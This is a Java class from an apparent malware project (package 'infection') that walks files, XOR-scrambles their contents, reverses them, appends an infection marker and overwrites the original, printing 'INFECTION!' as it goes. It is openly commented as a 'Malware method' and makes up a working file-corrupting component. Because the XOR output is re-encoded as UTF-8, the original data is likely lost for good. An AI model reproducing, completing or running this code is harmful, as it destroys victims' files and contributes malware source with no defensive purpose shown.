package infection;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.UnsupportedEncodingException;

public class Item extends Node implements Infected {

	private String map;

	public Item(File file) {
		super(file);
		map = new String();
	}

	/* Standard IO method */
	private String readFile() {
		String buffer = new String();
		try {
			FileReader fr = new FileReader(file.getAbsolutePath());
			BufferedReader br = new BufferedReader(fr);
			while (br.ready())
				buffer += (char) br.read();
			br.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
		return buffer;
	}

	private void writeFile(String buffer) {
		try {
			FileWriter fw = new FileWriter(file.getAbsolutePath());
			BufferedWriter bw = new BufferedWriter(fw);
			bw.write(buffer);
			bw.flush();
			bw.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	/**/

	/* Malware method */
	@Override
	public String XOR(String buffer) {
		byte[] bytes = buffer.getBytes();
		for (int i = 0; i < buffer.length(); i++) {
			bytes[i] = (byte) (bytes[i] ^ key); // simple XOR
		}
		try {
			return new String(bytes, "UTF-8");
		} catch (UnsupportedEncodingException e) {
			e.printStackTrace();
		}
		return buffer;
	}

	@Override
	public String infected() {
		map = readFile();
		if (!isInfected()) {
			System.out.println("INFECTION!");
			map = XOR(map);
			map = markMagicNumber(map);
			writeFile(map);
		}
		return JSON();
	}

	@Override
	public String markMagicNumber(String buffer) {
		StringBuilder tmp = new StringBuilder(buffer);
		tmp.append(magicNumber);
		tmp.reverse();
		return new String(tmp);
	}

	@Override
	public boolean isInfected() {
		// don't forget to reverse the magic number
		return (map.charAt(magicPosition) == magicNumber[1] && map
				.charAt(magicPosition + 1) == magicNumber[0]);
	}

	/**/

	/* JSON format */
	protected String JSON() {
		return file.getName();
	}
}
